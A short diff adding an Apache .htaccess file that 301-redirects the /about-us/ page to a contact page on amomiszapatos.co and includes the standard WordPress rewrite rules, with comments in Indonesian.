@@ -1,0 +1,16 @@
+# Redirect KHUSUS page /about-us/
+RewriteEngine On
+RewriteRule ^about-us/?$ https://amomiszapatos.co/contacto/ [L,R=301]
+
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+
+# Arahkan semua request ke index.php kalau file/folder tidak ada
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+# END WordPress
